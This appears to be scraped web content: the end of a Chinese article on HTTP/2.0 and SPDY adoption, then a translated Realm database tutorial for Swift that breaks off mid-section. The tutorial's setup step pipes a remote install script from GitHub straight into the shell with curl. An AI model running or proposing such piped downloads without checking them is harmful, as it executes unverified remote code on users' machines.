<h4><strong>更安全的SSL</strong></h4>
<p>HTTP2.0使用了tls的拓展ALPN来做协议升级，除此之外加密这块还有一个改动，HTTP2.0对tls的安全性做了近一步加强，通过黑名单机制禁用了几百种不再安全的加密算法，一些加密算法可能还在被继续使用。如果在ssl协商过程当中，客户端和server的cipher suite没有交集，直接就会导致协商失败，从而请求失败。在server端部署http2.0的时候要特别注意这一点。</p>
<h3><strong>3.2 HTTP2.0里的负能量</strong></h3>
<p>SPDY和HTTP2.0之间的暧昧关系，以及google作为SPDY的创造者，这两点很容易让阴谋论者怀疑google是否会成为协议的最终收益方。这其实是废话，google当然会受益，任何新协议使用者都会从中受益，至于谁吃肉，谁喝汤看的是自己的本事。从整个协议的变迁史也可以粗略看出，新协议的诞生完全是针对业界现存问题对症下药，并没有google业务相关的痕迹存在，google至始至终只扮演了一个角色：you can you up。</p>
<p>HTTP2.0不会是万金油，但抹了也不会有副作用。HTTP2.0最大的亮点在于多路复用，而多路复用的好处只有在http请求量大的场景下才明显，所以有人会觉得只适用于浏览器浏览大型站点的时候。这么说其实没错，但http2.0的好处不仅仅是multiplexing，请求压缩，优先级控制，server push等等都是亮点。对于内容型移动端app来说，比如淘宝app，http请求量大，多路复用还是能产生明显的体验提升。多路复用对延迟的改变可以参考下这个<a href=""https://http2.akamai.com/demo"" rel=""nofollow noreferrer"">测试网址</a>。</p>
<p>HTTP2.0对于ssl的依赖使得有些开发者望而生畏。不少开发者对ssl还停留在高延迟，CPU性能损耗，配置麻烦的印象中。其实ssl于http结合对性能的影响已经可以优化到忽略的程度了，网上也有不少文章可以参考。HTTP2.0也可以不走ssl，有些场景确实可能不适合https，比如对代理服务器的cache依赖，对于内容安全性不敏感的get请求可以通过代理服务器缓存来优化体验。</p>
<h3><strong>3.3 HTTP2.0的现状</strong></h3>
<p>HTTP2.0作为新版本的网络协议肯定需要一段时间去普及，但HTTP本身属于应用层协议，和当年的网络层协议IPV6不同，离底层协议越远，对网络基础硬件设施的影响就越小。HTTP2.0甚至还特意的考虑了与HTTP1.x的兼容问题，只是在HTTP1.x的下面做了一层framing layer，更使得其普及的阻力变小。所以不出意外，HTTP2.0的普及速度可能会远超大部分人的预期。</p>
<p>Firefox 2015年在其浏览器流量中检测到，有13%的http流量已经使用了http2.0，27%的https也是http2.0，而且还处于持续的增长当中。一般用户察觉不到是否使用了http2.0，不过可以装这样<a href=""https://addons.mozilla.org/en-US/firefox/addon/spdy-indicator/"" rel=""nofollow noreferrer"">一个插件</a>，安装之后如果网站是http2.0的，在地址栏的最右边会有个闪电图标。还可以使用<a href=""https://tools.keycdn.com/http2-test"" rel=""nofollow noreferrer"">这个网站</a>来测试。对于开发者来说，可以通过Web Developer的Network来查看协议细节，如下图：</p>
<p>[图12]</p>
<p>&lt;img src=""<a href=""https://github.com/music4kid/music4kid.github.io/blob/master/images/firefox_http2.png?raw=true&amp;quot"" rel=""nofollow noreferrer"">https://github.com/music4kid/music4kid.github.io/blob/master/images/firefox_http2.png?raw=true&amp;quot</a>; width=""552""&gt;</p>
<p>其中Version：HTTP／2.0已经很明确表明协议类型，Firefox还在header里面插入了X-Firefox-Spdy:“h2”，也可以看出是否使用http2.0。</p>
<p>Chrome在2015年检测到的http2.0流量大概有18%。不过这个数字本来会更高，因为Chrome现在很大一部分流量都在试验QUIC（google正在开辟的另一块疆土）。Chrome上也可以使用<a href=""https://chrome.google.com/webstore/detail/http2-and-spdy-indicator/mpbpobfflnpcgagjijhmgnchggcjblin"" rel=""nofollow noreferrer"">类似的插件</a>来判断网站是否是使用http2.0。</p>
<h1><strong>4. 移动端HTTP现状</strong></h1>
<h3><strong>4.1 iOS下http现状</strong></h3>
<p>iOS系统是从iOS8开始才通过NSURLSession来支持SPDY的，iOS9+开始自动支持http2.0。实际上apple对http2.0非常有信心，推广力度也很大。新版本ATS机制默认使用https来进行网络传输。APN（Apple Push Notifiction）在iOS9上也已经是通过http2.0来实现的了。iOS9 sdk里的NSURLSession默认使用http2.0，而且对开发者来说是完全透明的，甚至没有api来知道到底是用的哪个版本的http协议。</p>
<p>对于开发者来说到底怎么去配置最佳的http使用方案呢？在我看来，因app而异，主要从两方面来考虑：一是app本身http流量是否大而且密集，二是开发团队本身的技术条件。http2.0的部署相对容易很多，客户端开发者甚至不用做什么改动，只需要使用iOS9的SDK编译即可，但缺点是http2.0只能适用于iOS9的设备。SPDY的部署相对麻烦一些，但优点是可以兼顾iOS6+的设备。iOS端的SPDY可以使用twitter开发的CocoaSPDY方案，但有一点需要特别处理：</p>
<p>由于苹果的TLS实现不支持NPN，所以通过NPN协商使用SPDY就无法通过默认443端口来实现。有两种做法，一是客户端和server同时约定好使用另一个端口号来做NPN协商，二是server这边通过request header智能判断客户端是否支持SPDY而越过NPN协商过程。第一种方法会简单一点，不过需要从框架层将所有的http请求都map到另一个port，url mapping可以参考我之前的<a href=""http://music4kid.github.io/ios/2016/01/22/dnsmapping/"" rel=""nofollow noreferrer"">一篇文章</a>。twitter自己的网站twitter.com使用的是第二种方法。</p>
<p>浏览器端（比如Chrome），server端（比如nginx）都陆续打算放弃支持spdy了，毕竟google官方都宣布要停止维护了。spdy会是一个过渡方案，会随着iOS9的普及会逐步消失，所以这部分的技术投入需要开发团队自己去衡量。</p>
<h3><strong>4.2 Android下http现状</strong></h3>
<p>android和iOS情况类似，http2.0只能在新系统下支持，spdy作为过渡方案仍然有存在的必要。</p>
<p>对于使用webview的app来说，需要基于chrome内核的webview才能支持spdy和http2.0，而android系统的webview是从android4.4（KitKat）才改成基于chrome内核的。</p>
<p>对于使用native api调用的http请求来说，okhttp是同时支持spdy和http2.0的可行方案。如果使用ALPN，okhttp要求android系统5.0+(实际上，android4.4上就有了ALPN的实现，不过有bug，知道5.0才正式修复)，如果使用NPN，可以从android4.0+开始支持，不过NPN也是属于将要被淘汰的协议。</p>
<h1><strong>结束语</strong></h1>
<p>以上是HTTP从1.x到SPDY，再到HTTP2.0的一些主要变迁技术点。HTTP2.0正处于逐步应用到线上产品和服务的阶段，可以预见未来会有不少新的坑产生和与之对应的优化技巧，HTTP1.x和SPDY也将在一段时间内继续发挥余热。作为工程师，需要了解这些协议背后的技术细节，才能打造高性能的网络框架，从而提升我们的产品体验。</p>
<h4><strong>参考链接：</strong></h4>
<p><a href=""http://http2-explained.haxx.se/content/en/part5.html"" rel=""nofollow noreferrer""></a><a href=""http://http2-explained.haxx.se/content/en/part5.html"" rel=""nofollow noreferrer"">http://http2-explained.haxx.se/content/en/part5.html</a></p>
<p><a href=""https://www.chromium.org/spdy/spdy-whitepaper"" rel=""nofollow noreferrer""></a><a href=""https://www.chromium.org/spdy/spdy-whitepaper"" rel=""nofollow noreferrer"">https://www.chromium.org/spdy/spdy-whitepaper</a></p>

                ", HTTP2.0的那些事,1531972058,282,1,746,1,1,https://segmentfault.com/a/1190000004399183
119,1,0,6,"
                    
<blockquote><p>作者：Hossam Ghareeb，<a href=""http://www.appcoda.com/realm-database-swift/"" rel=""nofollow noreferrer"">原文链接</a>，原文日期：2015-10-28<br>译者：<a href=""http://www.futantan.com"" rel=""nofollow noreferrer"">Prayer</a>；校对：<a href=""https://github.com/Cee"" rel=""nofollow noreferrer"">Cee</a>；定稿：<a href=""http://weibo.com/xiaoxxiao"" rel=""nofollow noreferrer"">千叶知风</a></p></blockquote>
<p>智能手机的快速发展的同时，涌现出了很多对开发者友好的开发工具。这些工具不仅使得开发变得更加简单和容易，同时也保证了性能和产品质量。如今想要在 App Store 中占据一席之地，并非易事。而且想要使得应用易于扩展就更加困难了。当你成功获得百万量级的用户时，应用中的每一个细节都不能放过，并且需要在很短的时间完成对细节的打磨。所以和数据库打交道，是很多开发者都会面临的一个问题。相信我们每个人都会因为数据库引起的各种问题而头疼不已，对于数据库，我想如今我们只有两种选择：<a href=""http://www.appcoda.com/sqlite-database-ios-app-tutorial/"" rel=""nofollow noreferrer"">SQLite</a> 和 <a href=""http://www.appcoda.com/introduction-to-core-data/"" rel=""nofollow noreferrer"">Core Data</a>。我是 Core Data 的忠实粉丝，它对记录（records）的处理和持久化数据的能力非常强大，但是我意识到，在开发应用的过程中，我在 Core Data 上浪费了太多的时间。最近，我无意中发现了 Realm，一个可以替代 SQLite 和 Core Data 的更好的解决方案。</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-db-1024x683.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>&lt;!--more--&gt;</p>
<h2>Realm 是什么？</h2>
<p>Realm 是一个跨平台的移动终端数据库，支持 iOS（Swift 和 Objective-C 语言都支持）和 Android。Realm 的目的就是提供比 SQLite 和 Core Data 更好更快的数据库支持。它不仅仅是更好和更快，而且更加易于使用，短短几行代码就可以完成很多操作。Realm 完全免费，你可以随意使用它。Realm 是为移动设备而生的，因为在过去的十年中，移动终端的数据库技术没有任何的革新。现在如果和移动终端的数据库打交道，你只有一种选择，使用 SQLite 或者是底层封装了 SQLite 的技术比如 Core Data。Realm 的目的是更加易用，它并不是一个建立在 SQLite 之上的 ORM，而是一个基于自己的持久化引擎，简单并且快速的面向对象移动数据库。</p>
<h2>为什么选择 Realm？</h2>
<p><a href=""https://realm.io/cn/"" rel=""nofollow noreferrer"">Realm</a>拥有令人难以置信的速度并且使用起来非常简单，你会发现，无论是想完成数据库的读还是写操作，都只需要短短的几行代码。下面我会列出它的所有优势，并说明为什么 Realm 是你在移动应用上数据库的不二选择：</p>
<ul>
<li><p><strong>安装简单</strong>：在下一个章节 — 如何使用 Realm 中你会了解到，安装 Realm 会比你想象的更为简单。使用简单的 Cocoapods 命令，你就可以完成所有的安装工作。</p></li>
<li><p><strong>速度更快</strong>：使用 Realm 库操作数据库的速度非常快。它比 SQLite 和 CoreData 都更加快速，<a href=""https://realm.io/news/introducing-realm/#fast"" rel=""nofollow noreferrer"">这里</a>有它们之间的比较指标作为证据。</p></li>
<li><p><strong>跨平台</strong>：Realm 的数据库文件是跨平台的，可以在 iOS 和 Android 间共享。无论你是使用 Java、Objective-C 或者 Swift，都可以使用相同的抽象模型访问。</p></li>
<li><p><strong>易于扩展</strong>：如果你的移动应用需要处理大量的用户数据记录，数据库的可扩展性就显得十分重要。在开始着手开发应用之前，这一点就应该被考虑在内。Realm 提供很好的可扩展性，在操作大量的数据时，速度也非常之快。选择使用 Realm 可以为你的应用带来更快的速度和更加流畅的用户体验。</p></li>
<li><p><strong>规范的文档和很好的支持</strong>：Realm 提供了丰富的大量条理清晰、易于阅读的文档。如果你有任何的问题，你也可以通过 Twitter、Github 或 Stackoverflow 来获得帮助。</p></li>
<li><p><strong>可信任</strong>：Realm 已经被大量的初创公司和大公司用于它们的移动应用中，像 Pinterest、Dubsmash 和 Hipmunk。</p></li>
<li><p><strong>免费</strong>：除了以上这些极好的优点以外，它还是完！全！免！费！的！</p></li>
</ul>
<h2>让我们开始动手吧</h2>
<p>让我们开始学习 Realm，使用它来构建一个简单的使用 Swift 语言的 iPhone 应用。所完成的 demo 程序是一个简单的 Todo 应用。用户可以增加任务清单，每个任务清单都能够包含多个任务。任务拥有名称、备注、到期日期，可以添加图片，并且拥有一个布尔值来表示该任务是否已经完成。在开始创建 Xcode 项目之前，我们需要先配置好 Xcode，安装使用 Realm 所需的工具。</p>
<h2>环境要求</h2>
<p>请注意需要满足下列要求</p>
<ul>
<li><p>iOS 8 及更高的版本，OS X 10.9 及更高的版本</p></li>
<li><p>Xcode 6.3 及更高版本</p></li>
<li><p>Realm 有两个发行版，一个针对 Swift 2.0，另一个针对 Swift 1.2。我们推荐您使用 Swift 2.0 的版本。当然你也可以使用针对 Swift 1.2 的版本，但是以后这个版本 Realm 不会再进行更新支持，所以为了保险起见，使用 Swift 2.0 对应的版本，是个更好的选择。</p></li>
</ul>
<h2>配置 Xcode 和所需的工具</h2>
<p>在开始配置 Xcode 项目之前，请确保运行环境已经正确安装了 CocoaPods，我们将使用它来为项目安装 Realm。如果对 <a href=""https://cocoapods.org/"" rel=""nofollow noreferrer"">CocoaPods</a> 不熟悉，你可以查看在线的教程，这些教程的材料足够让你明白如何开始使用它。</p>
<p>现在，使用 <code>Single View Application</code> 项目模板创建一个 Xcode 工程，命名为 <code>RealmTasks</code> 或者其他你喜欢的名字。请确保选择 Swift 作为开发语言。之后在终端中进入到该工程目录，使用如下命令来初始化 CocoaPods：</p>
<pre><code>bash
pod init
</code></pre>
<p>然后使用 Xcode 打开生成的 Podfile 文件，在 target 之后，添加 <code>pod 'RealmSwift'</code>，修改完之后，应该是下面这个样子：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-podfile-1024x430.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>下面运行 <code>pod install</code> 命令来把 Realm 下载安装到项目中。完成之后，你会在你的工程文件目录发现一个新生成的 Xcode 工作空间。请确保打开 <strong>RealmTasks.xcworkspace</strong> 而不是 xcodeproj。打开工作空间后，你会看到像下面这样的情形：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-pod-folder-1024x446.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在就可以在 Xcode 中使用 Realm 啦，但是我们将安装下面的小工具来让使用 Realm 的过程更加容易。</p>
<h2>在 Xcode 中安装 Realm 插件</h2>
<p>Realm 开发团队提供了一个生成 Realm 模型非常有用的插件。为了安装这个插件，我们要使用 <a href=""http://alcatraz.io/"" rel=""nofollow noreferrer"">Alcatraz</a>。如果你不知道 Alcatraz 是什么的话，这里解释一下，它是一个简单有用的开源包管理工具，它可以让你无需任何配置，自动地为 Xcode 安装插件、文件模板和颜色主题。为了安装 Alcatraz，你只需将以下代码复制到终端中执行，之后重启 Xcode：</p>
<pre><code>bash
curl -fsSL https://raw.githubusercontent.com/supermarin/Alcatraz/master/Scripts/install.sh | sh
</code></pre>
<p>然后在 Xcode 中，选择 <code>Window</code> -&gt; <code>Package Manager</code>，如下图：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-package-manager-1024x334.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>然后在弹出的窗口中，你可以选择安装你喜欢的插件或者文件模板，在搜索框中你可以搜索你喜欢的插件、配色。在搜索框输入「Realm」，在出现的结果中选择「RealmPlugin」，点击 <code>Install</code> 按钮</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-plugin-1024x996.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>Realm 浏览器</h2>
<p>给大家介绍的最后一个工具是 Realm 浏览器。这个浏览器可以帮助你阅读和编辑你的 <code>.realm</code> 数据库文件。这些文件在应用程序中被创建，在数据库表中保存了所有的数据实体（entities）、属性（attributes）和记录（records）。之前我们说过，这些数据库文件可以在像 iOS 和 Android 这样不同的平台间共享。想要下载最新版本的 Realm 浏览器，请访问 <a href=""https://itunes.apple.com/app/realm-browser/id1007457278"" rel=""nofollow noreferrer"">iTunes store</a>。打开 Realm 浏览器，选择 <code>Tools</code> -&gt; <code>Generate demo database</code>。它会帮你生成 realm 数据库测试文件，你可以使用该浏览器打开和编辑它的内容。当你打开的时候，你会看到像下面的内容：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/browser.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>正如你所见，在 RealmTestClass1 中，它拥有 1000 条记录，显示了多种不同的参数类型（即「列」）。我们会在下节介绍支持的属性类型。</p>
<p>现在，Realm 的所有准备工作都已就绪，那我们开始动手吧！</p>
<h2>数据模型类</h2>
<p>好戏才刚刚开始。首先我们来创建模型类或者说我们的数据库。为了创建 Realm 数据模型类，你只需要简单地新建一个普通的 Swift 类继承自 Object 就可以了。因为 Realm 数据模型类的基类是 Object，所以 Object 的子类都可以扩展为 Realm 的模型类。一旦创建类后，就可以添加属性了。Realm 支持以下多种数据类型：</p>
<p>– Int，Int8，Int16，Int32 和 Int64<br>– Boolean<br>– Float<br>– String<br>– NSDate<br>– NSData<br>– 继承自 Object 的类 =&gt; 作为一对一关系（Used for One-to-one relations）<br>– List&lt;Object&gt; =&gt; 作为一对多关系（Used for one-to-many relations）</p>
<p>Realm 中的 List 可以包含多个 Object 实例，参考上面 demo 数据库的截图，最后一列表示在其他数据表中的存在的一组引用。在和 Realm 模型类打交道的时候，使用的方式和其他 Swift 类一样。例如，你可以添加方法或者遵循指定的协议。</p>
<p>多说无益，来看代码 ?</p>
<p>现在让我们使用之前在 Xcode 中安装的 Realm 插件来新建一个 Realm 类。打开 Xcode，新建文件，在右边的侧边栏选择 Realm：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm_model.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>然后选择 Swift 语言，类名我们输入 Task。会得到如下结果：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/Task_swift.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在，可以向 Task 数据模型中添加属性了。</p>
<h2>属性</h2>
<p>我们需要在数据模型中添加需要的属性。该例子中，Task 需要有 name（String），createdAt（NSDate)），notes（String），和 isCompleted（Bool）这些属性。添加这些之后，代码应该像下面这样子：</p>
<pre><code>
class Task: Object {
    
  dynamic var name = """"
  dynamic var createdAt = NSDate()
  dynamic var notes = """"
  dynamic var isCompleted = false

// 声明让 Realm 忽略的属性（Realm 将不持有这些属性）
    
//  override static func ignoredProperties() -&gt; [String] {
//    return []
//  }
}
</code></pre>
<p>我们已经为 Task 模型类添加了属性，所有的属性前面都加了 <code>dynamic var</code> 前缀，这使得属性可以被数据库读写。</p>
<p>接下来，我们要创建 TaskList 模型类，用来存储 Task 实例：</p>
<pre><code>
class TaskList: Object {
    
  dynamic var name = """"
  dynamic var createdAt = NSDate()
  let tasks = List&lt;Task&gt;()
    
// 声明让 Realm 忽略的属性（Realm 将不持有这些属性）
    
//  override static func ignoredProperties() -&gt; [String] {
//    return []
//  }
}
</code></pre>
<p>TaskList 模型类拥有 name，createAt 和一个包含 Task 的 List 属性。需要注意的是：</p>
<ol>
<li><p>List&lt;Object&gt; 用来表示一对多的关系：一个 TaskList 中拥有多个 Task。</p></li>
<li><p>List 和 Array 在使用上非常相似，所用的方法和访问数据的方式（索引和下标）都相同。正如你所见的一样，List 后标明了数据类型，所包含的所有对象都应该是相同类型的。</p></li>
<li><p>List 是泛型，这也是为什么我们没有在声明前面加上 dynamic 的原因，因为在 Objective-C 运行时无法表示泛型属性。</p></li>
</ol>
<p>就像在之前实现中你看到的一对多关系那样，在 Realm 中创建数据关系非常简单。在使用一对一的关系时，我们不使用 List 而是使用 Object 类型，来看下面的例子：</p>
<pre><code>
class Person: Object{
  dynamic var name = """"
}
 
class Car: Object{
  dynamic var owner:Person?
}
</code></pre>
<p>上面的例子中，owner 属性表示 Car 和 Person 之间的一对一数据关系。</p>
<p>现在基本的数据模型都已经创建好了。接下来我们会通过创建一个 ToDo 应用的过程，来讨论 Realm。首先，<a href=""https://github.com/hossamghareeb/realmtasks"" rel=""nofollow noreferrer"">从这里下载 app</a> 并且一窥究竟。在 Xcode 7 或更高的版本中运行，就像下面这样：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-todo-list-app-1024x661.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在项目中，我添加了两个视图控制器：TasksViewController 和 TaskListViewController。第一个视图控制器用来显示单个 task，第二个视图控制器用来显示所有的 TaskList。在 list 视图中，点击 + 按钮来添加一个任务清单。选择一个任务清单将会详情视图。你可以在这里添加多个 task。</p>
<p>了解了 demo 的大体思路之后，现在让我们来看看如何向 Realm 数据库中添加一个新的任务清单。为了实现这个功能，需要如下处理：</p>
<ol>
<li><p>创建 TaskList 实例对象，并将其保存到 Realm 数据库中。</p></li>
<li><p>向数据库中查询 list 数据，并更新 UI。</p></li>
</ol>
<p>为了在 Realm 中保存数据，你只需要实例化继承自 Object 的数据模型类，然后将对象写入到 Realm 中，下面是示例代码：</p>
<pre><code>
let taskListA = TaskList()
taskListA.name = ""Wishlist""
        
let wish1 = Task()
wish1.name = ""iPhone6s""
wish1.notes = ""64 GB, Gold""
        
let wish2 = Task(value: [""name"": ""Game Console"", ""notes"": ""Playstation 4, 1 TB""])
let wish3 = Task(value: [""Car"", NSDate(), ""Auto R8"", false])
 
taskListA.tasks.appendContentsOf([wish1, wish2, wish3])
</code></pre>
<p>通过实例化 TaskList 类，我们创建了一个任务清单，之后设置了它的属性。随后我们创建了 3 个 Task 类型的对象（即 wish1，wish2 和 wish3）。这里我们演示了创建 Realm 对象的三种途径：</p>
<ol>
<li><p>wish1 的实例化方式：简单的实例化 Realm 类，然后设置属性。</p></li>
<li><p>wish2 的实例化方式：传入一个字典，字典中的 key 为属性名，值为要设置的值。</p></li>
<li><p>wish3 的实例化方式：使用数组传入的方式。数组中值的顺序需要和模型类中的声明顺序一致。</p></li>
</ol>
<h3>嵌套对象</h3>
<p>在 Realm 中还可以是使用嵌套的方式来创建对象。在一对一关系和一对多关系的时候，你可以使用这种方式，这时候，一个类型对象的初始化需要一个 Object 或多个另一个类型的对象 List&lt;Object&gt;。面临这种情况的时候，你可以选择上面的第二或者第三种方法，使用一个字典或者一个数组来表示一个对象。下面是嵌套对象的一个例子：</p>
<pre><code>
let taskListB = TaskList(value: [""MoviesList"", NSDate(), [[""The Martian"", NSDate(), """", false], [""The Maze Runner"", NSDate(), """", true]]])
</code></pre>
<p>在上面的代码中，我们创建了一个电影清单，并设置了清单名称、创建时间和清单内容，清单内容包括多个 task。每个 task 使用数组的方式来创建，例如 <code>[""The Maze Runner"", NSDate(), """", true]</code> 表示一个 task，内容分别对应了名称、创建时间、备注和是否已经完成。</p>
<h2>使用 Realm 持久化对象</h2>
<p>现在你应该知道了如何在 Realm 中创建和使用对象，但是为了能够在应用程序重新启动的时候使用这些数据，需要使用写事务将它们持久化到 Realm 的数据库中。当使用 Realm 来持久化数据的时候，只要这些对象已经存储成功，你可以在任何线程中获取这些对象。一个 Realm 实例表示一个 Realm 数据库。可以像下面一样实例化它：</p>
<pre><code>
let uiRealm = try! Realm()
</code></pre>
<p>我们常常将上面这行代码写在 <code>AppDelegate.swift</code> 文件的顶端（译者注：类之外，全局变量），这样就可以在整个项目中获得该对象的引用。之后便可以很方便地调用它的读和写方法：</p>
<pre><code>
uiRealm.write { () -&gt; Void in
  uiRealm.add([taskListA, taskListB])
}
</code></pre>
<p>首先，uiRealm 对象已经在 AppDelegate 中创建，在整个 app 中都可以使用。Realm 对象在每个线程中都应该只被创建一次，因为它不是线程安全的，不能在不同的线程中共享。如果你想要在另一个线程中执行写操作，那么就需要创建一个新的 Realm 对象。我将这个实例命名为 <code>uiRealm</code>，就是因为它应该只在 UI 线程中被使用。</p>
<p>现在让我们回到我们的 app 中，我们需要在用户点击 Create 按钮的时候保存任务列表。在 <code>TasksViewController</code> 的 <code>displayAlertToAddTask </code>方法中，我们有一个 <code>createAction</code> 对象：</p>
<pre><code>
let createAction = UIAlertAction(title: doneTitle, style: UIAlertActionStyle.Default) { (action) -&gt; Void in
    
    let taskName = alertController.textFields?.first?.text
    
    if updatedTask != nil{
        // update mode
        uiRealm.write({ () -&gt; Void in
            updatedTask.name = taskName!
            self.readTasksAndUpateUI()
        })
    }
    else{
        
        let newTask = Task()
        newTask.name = taskName!
        
        uiRealm.write({ () -&gt; Void in
            
            self.selectedList.tasks.append(newTask)
            self.readTasksAndUpateUI()
        })
    }
 
}
</code></pre>
<p>在上面的代码中，我们从 TextField 中获取到任务名称，调用 Realm 的写方法来保存任务列表。</p>
<p><em>请注意，当你同时进行多个写操作的时候，他们会相互阻塞，阻塞住他们所运行的线程。所以应当考虑在 UI 之外的线程中来进行操作。另外需要注意的是，在进行写事务的时候，读操作并不会造成阻塞。这非常有用，尤其是当你在后台进行写操作的时候，用户可能会在不同界面切换，而这时候可以进行读操作。</em></p>
<h2>检索数据</h2>
<p>现在你已经学会了如何在 Realm 中写数据，下面我们来看看如何检索数据。在 Realm 中检索数据的方式非常直观。Realm 提供了很多选项来过滤出你想要的数据。在 Realm 中进行查找操作的时候，它将会返回一个 Results 对象。可以把 Results 简单地当做是 Swift 的数组，因为它们的接口非常类似。</p>
<p>当得到 Results 实例的时候，这代表你已经从磁盘中直接获取到了数据。对这些数据的任何操作（使用事务）将会影响到磁盘上的数据。在 Realm 中来检索数据，只需要调用对象的方法，并将类名作为参数传进去。让我们看看如何使用这种方式来读取 TaskLists 并更新 UI：</p>
<p>我们在 <code>TasksListsViewController</code> 中定义了该属性：</p>
<pre><code>
var lists : Results&lt;TaskList&gt;!
</code></pre>
<p>然后实现了 <code>readTasksAndUpdateUI</code> 方法：</p>
<pre><code>
func readTasksAndUpdateUI(){
    
    lists = uiRealm.objects(TaskList)
    self.taskListsTableView.setEditing(false, animated: true)
    self.taskListsTableView.reloadData()
}
</code></pre>
<p>在 <code>tableView(_:cellForRowAtIndexPath:_)</code> 方法中，我们将显示列表的名称，还有每个列表内的任务个数：</p>
<pre><code>
func tableView(tableView: UITableView, cellForRowAtIndexPath indexPath: NSIndexPath) -&gt; UITableViewCell{
    
    let cell = tableView.dequeueReusableCellWithIdentifier(""listCell"")
    
    let list = lists[indexPath.row]
    
    cell?.textLabel?.text = list.name
    cell?.detailTextLabel?.text = ""\(list.tasks.count) Tasks""
    return cell!
}
</code></pre>
<p>代码逻辑非常直观吧。最后需要做的就是在 <code>viewWillAppear</code> 中调用 <code>readTasksAndUpdateUI</code> 方法，来确保总是显示数据更新之后的视图。</p>
<pre><code> 
override func viewWillAppear(animated: Bool) {
    readTasksAndUpdateUI()
}
</code></pre>
<p>上面展示了如何使用 Realm 来进行任务列表的读写操作。接下来，我们来看看如何进行数据更新和删除操作。在开始之前，先来看看项目模板中的修改和删除部分的相关代码。</p>
<p>首先在 <code>TaskListsViewController</code> 中，我们用一个布尔值 <code>isEditingMode</code> 来表示是在正常状态还是编辑状态：</p>
<pre><code>
var isEditingMode = false
</code></pre>
<p>当 Edit 按钮被点击的时候，将会调用 <code>didClickOnEditButton</code> 方法：</p>
<pre><code>
@IBAction func didClickOnEditButton(sender: UIBarButtonItem) {
    isEditingMode = !isEditingMode
    self.taskListsTableView.setEditing(isEditingMode, animated: true)
}
</code></pre>
<p>这个方法会使用 table view 的 <code>setEditing</code> 方法来启用或禁用 UITableView 的编辑模式。在表格视图中，默认的编辑操作是删除，但是从 iOS 8.0 开始，增加了一个 <code>editActionsForRowAtIndexPath</code> 方法来自定义一些操作，这些操作在在用户滑动表格 cell 的时候出现。</p>
<p>我们将使用该方法来添加两个功能 — 删除和编辑，代码如下：</p>
<pre><code>
func tableView(tableView: UITableView, editActionsForRowAtIndexPath indexPath: NSIndexPath) -&gt; [UITableViewRowAction]? {
    let deleteAction = UITableViewRowAction(style: UITableViewRowActionStyle.Destructive, title: ""Delete"") { (deleteAction, indexPath) -&gt; Void in
        
        //这里开始是删除
        
        let listToBeDeleted = self.lists[indexPath.row]
        uiRealm.write({ () -&gt; Void in
            uiRealm.delete(listToBeDeleted)
            self.readTasksAndUpdateUI()
        })
    }
    let editAction = UITableViewRowAction(style: UITableViewRowActionStyle.Normal, title: ""Edit"") { (editAction, indexPath) -&gt; Void in
        
        // 这里开始是编辑
        let listToBeUpdated = self.lists[indexPath.row]
        self.displayAlertToAddTaskList(listToBeUpdated)
        
    }
    return [deleteAction, editAction]
}
</code></pre>
<p>这里我们使用 <code>UITableViewRowAction</code> 添加了两个操作，方法中定义了操作的 <code>style</code>，<code>title</code> 和 <code>handler</code>。当在滑动 cell 或者以其他方式进入编辑模式的时候，会像下面这样：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/edit-mode-576x1024.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>以上就是在进行删除和更新操作时候的 UI 代码逻辑。</p>
<h2>删除对象</h2>
<p>想要从 Realm 数据库中删除对象或者数据，你只需要调用 Realm 对象的 <code>delete</code> 方法，同时将该对象作为参数传入。当然，这些操作会在写事务中完成。来看一下下面的代码的工作方式，我们从 Realm 数据库中删除了一个任务列表：</p>
<pre><code>
let listToBeDeleted = self.lists[indexPath.row]
uiRealm.write({ () -&gt; Void in
           uiRealm.delete(listToBeDeleted)
           self.readTasksAndUpdateUI()
    })
</code></pre>
<p>在删除之后，我们调用了 <code>readTasksAndUpdateUI</code> 方法来读取数据并更新 UI。</p>
<p>除了删除单个数据，在 Realm 中，还有一个方法叫做 <code>deleteAll</code>，它允许你删除数据库中所有 class 的所有数据。如果你想为当前用户持久化数据，但是在他退出登录的时候抹掉所有的相关数据，这个方法将会十分有用。</p>
<pre><code>
uiRealm.write({ () -&gt; Void in
    uiRealm.deleteAll()
})
</code></pre>
<h2>更新 Objects</h2>
<p>在 Realm 中有多种方式可以来更新 object，但是这些方法都应该在写事务中完成。下面我们来看一些更新对象的方式。</p>
<h3>使用属性（Property）</h3>
<p>你可以通过直接在 Realm 的写闭包中设置属性的值来更新数据。例如，在 <code>TasksViewController</code> 中，我们可以简单地设置属性值来更新任务的状态信息：</p>
